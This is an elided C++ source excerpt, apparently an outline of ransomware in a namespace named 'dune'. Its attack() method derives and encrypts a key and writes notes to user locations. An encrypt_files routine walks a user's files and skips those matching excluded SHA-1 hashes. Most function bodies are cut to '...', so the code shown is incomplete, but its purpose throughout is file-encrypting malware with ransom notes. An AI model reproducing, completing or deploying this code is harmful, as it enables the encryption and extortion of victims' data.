...
namespace dune
{
    ...
    public:
        ...
        ATTACK_STATUS attack(Acknowledgement agreement, std::string root_dir, bool detatch = false)
        {
            ...
            derive_key();
            encrypt_derived_key();
            if (write_note() != (int)user_notes_locations.size())
            {
    ...
    private:
        ...
        static inline std::string compute_file_hash(std::string fname)
        {
            ...
            return chars_to_hex(std::string((const char *)sha1_hash, SHA_DIGEST_LENGTH));
        }
        ...
        static void encrypt_files(std::string enc_key, std::vector<std::string> excluded_hashes, std::string user_home)
        {
            ...
            for (uint64_t i = 0; i < files_to_encrypt.size(); i++)
            {
                try
                {
                    bool skip = false;
                    std::string hash_to_check = compute_file_hash(files_to_encrypt[i]);
                    for (uint64_t j = 0; j < excluded_hashes.size(); j++)
                    {
        ...
        int write_note()
        {
            ...
            int success = 0;
            for (uint64_t i = 0; i < user_notes_locations.size(); i++)
            {
                try
                {
